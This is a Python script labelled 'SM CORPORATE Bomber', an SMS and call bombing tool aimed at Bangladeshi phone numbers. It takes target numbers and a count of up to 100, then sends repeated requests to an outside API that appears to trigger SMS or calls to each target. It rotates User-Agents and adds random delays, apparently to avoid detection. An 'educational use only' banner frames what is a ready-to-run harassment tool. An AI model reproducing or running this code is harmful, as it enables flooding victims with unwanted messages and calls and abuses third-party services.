import requests
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

# ASCII Art
SM_ART = f"""
{Colors.CYAN}
                          _____ __  __ 
                        / ____|  \/  |
                       | (___ | \✨/ |
                        \___ \| |\/| |
                        ____) | |  | |
                       |_____/|_|  |_|

                 {Colors.YELLOW}=== SM CORPORATE 🍁 Bomber ==={Colors.RESET}
                 Coded by: SM 🍁 
                 For Educational Use Only!
"""

# API configuration
API = {
    "name": "Trial API",
    "url": "https://bomberdemofor2hrtcs.vercel.app/api/trialapi",
    "method": "GET",
    "params": {"phone": "{number}", "type": "{type}"}
}

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    try:
        os.system("clear" if os.name == "posix" else "cls")
    except Exception:
        print("\n" * 50)  # Fallback for Termux issues

def validate_phone(phone):
    return phone.strip().isdigit() and len(phone.strip()) == 11 and phone.strip().startswith("01")

def send_request(phone, request_type, count):
    url = API["url"]
    params = {key: value.replace("{number}", phone).replace("{type}", request_type) for key, value in API["params"].items()}
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    success = True

    for i in range(count):
        try:
            response = requests.get(url, params=params, headers=headers, timeout=10)
            if response.status_code == 200:
                print(f"{Colors.GREEN}Successful{Colors.RESET}")
            else:
                print(f"{Colors.RED}Failed{Colors.RESET}")
                success = False
        except requests.RequestException:
            print(f"{Colors.RED}Failed{Colors.RESET}")
            success = False
        time.sleep(random.uniform(1, 2))  # Random delay between 1-2 seconds

    return success

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone numbers input
    try:
        phone_input = input(f"{Colors.CYAN}Enter Bangladeshi number (e.g., 01712345678): {Colors.RESET}").strip()
        phone_numbers = [phone.strip() for phone in phone_input.split(",") if phone.strip()]
        
        # Validate phone numbers
        if not phone_numbers:
            print(f"{Colors.RED}No valid numbers entered!{Colors.RESET}")
            input("Press Enter to exit...")
            return
        for phone in phone_numbers:
            if not validate_phone(phone):
                print(f"{Colors.RED}Invalid number {phone}! Must be 11 digits starting with 01.{Colors.RESET}")
                input("Press Enter to exit...")
                return
    except Exception as e:
        print(f"{Colors.RED}Error in phone input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Request type input
    try:
        request_type = input(f"{Colors.CYAN}Enter request type (1 for SMS, 2 for Call): {Colors.RESET}").strip()
        if request_type not in ["1", "2"]:
            print(f"{Colors.RED}Invalid request type! Enter 1 for SMS or 2 for Call.{Colors.RESET}")
            input("Press Enter to exit...")
            return
        request_type = "sms" if request_type == "1" else "call"
    except Exception as e:
        print(f"{Colors.RED}Error in request type input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Count input
    try:
        count = int(input(f"{Colors.CYAN}Enter number of requests (1-100): {Colors.RESET}").strip())
        if not (1 <= count <= 100):
            raise ValueError("Count must be between 1 and 100")
    except ValueError as e:
        print(f"{Colors.RED}Invalid count! {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Confirm send
    try:
        send = input(f"{Colors.CYAN}Type 'Send' to start: {Colors.RESET}").strip().lower()
        if send != "send":
            print(f"{Colors.RED}Operation cancelled!{Colors.RESET}")
            input("Press Enter to exit...")
            return
    except Exception as e:
        print(f"{Colors.RED}Error in send input: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Process requests for each number
    for phone in phone_numbers:
        print(f"\n{Colors.CYAN}Processing {request_type.upper()} for {phone}...{Colors.RESET}")
        send_request(phone, request_type, count)

    print(f"\n{Colors.GREEN}Operation completed!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}Unexpected error: {str(e)}{Colors.RESET}")
        input("Press Enter to exit...")
